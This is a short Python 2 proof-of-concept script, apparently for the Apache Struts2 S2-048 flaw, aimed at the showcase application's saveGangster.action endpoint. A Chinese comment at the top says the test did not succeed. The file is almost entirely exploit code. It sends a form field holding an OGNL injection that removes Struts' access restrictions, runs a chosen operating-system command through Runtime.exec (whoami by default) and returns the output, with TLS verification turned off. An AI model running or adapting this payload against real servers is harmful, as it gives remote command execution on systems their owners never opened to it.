#coding:utf-8
'''
测试没有成功
2018/06/27
'''
import sys
import requests

requests.packages.urllib3.disable_warnings()


def poccheck(url, cmd='whoami'):
    result = False
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
        'Content-Type': "application/x-www-form-urlencoded"
    }
    data = "name=${(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()).(#p=@java.lang.Runtime@getRuntime().exec('%s')).(@org.apache.commons.io.IOUtils@copy(#p.getInputStream(),#o)).(#o.flush())}&age=1212&__checkbox_bustedBefore=true&description=123" % str(
        cmd)
    if 'integration' not in url:
        url = url + "/struts2-showcase/integration/saveGangster.action"
    try:
        response = requests.post(url, data=data, headers=header, verify=False, allow_redirects=False)
        if response.status_code == 200 and 'struts2-showcase' not in response.content:
            result = response.content
    except Exception as e:
        print str(e)
        pass
    return result


if __name__ == '__main__':
    url = 'http://127.0.0.1:8083/integration/saveGangster.action'
    res = poccheck(url)
    print res